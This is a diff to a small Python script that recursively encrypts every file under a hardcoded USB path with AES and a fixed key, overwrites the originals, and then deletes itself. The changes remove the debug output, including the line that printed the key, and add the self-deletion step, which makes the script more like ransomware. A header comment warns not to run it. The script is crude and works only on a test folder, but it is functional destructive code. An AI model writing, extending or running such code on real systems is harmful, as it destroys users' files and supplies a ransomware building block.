@@ -1,12 +1,21 @@
+#
+#This one encrypts all files and then deletes itself so don't run it
+#
+
+
 from Crypto.Cipher import AES
 import base64
 import os
 import glob
+from os import remove
 
 
-path = "/Volumes/NO NAME/testfiles/"
+orPath = os.path.realpath(__file__)
+
+path = "/media/usb1/testfiles/"
+#path = "/Volumes/NO NAME/testfiles/"
 os.chdir(path)
-currentPath = os.getcwd()
+
 
 
 
@@ -17,29 +26,23 @@ for filename in glob.iglob(path + '**/*', recursive=True):
     if os.path.isfile(filename) == True:
         file = open(filename)
         text = file.read()
-        print(text)
+        
         def encryption(info) :
             BLOCK_SIZE = 16
             PADDING ='{'
             pad = lambda s: s+ (BLOCK_SIZE - len(s) % BLOCK_SIZE)*PADDING
-            key = 'CE10BDC7BDF43EDE08D8A856AF1DD6B8' #os.urandom(BLOCK_SIZE)
+            key = 'CE10BDC7BDF43EDE08D8A856AF1DD6B8' 
             cipher= AES.new(key)
             EncodeAES = lambda c, s: base64.b64encode(c.encrypt (pad (s)))
-            print('key')
-            print (key)
             encoded = EncodeAES(cipher, info)
-            print ('encoded')
-            print (encoded)
             return encoded
-
+        
         outputText = encryption(text)
-        print('Pre output text')
-        print(outputText)
-        print('Text done')
-
         file = open(filename, "wb")
         file.write(outputText)
         file.close()
-        print('File done')
+        print("{0} encrypted".format(filename))
+        
     
-print('Program done')
+print('Encryption done')
+remove(orPath)
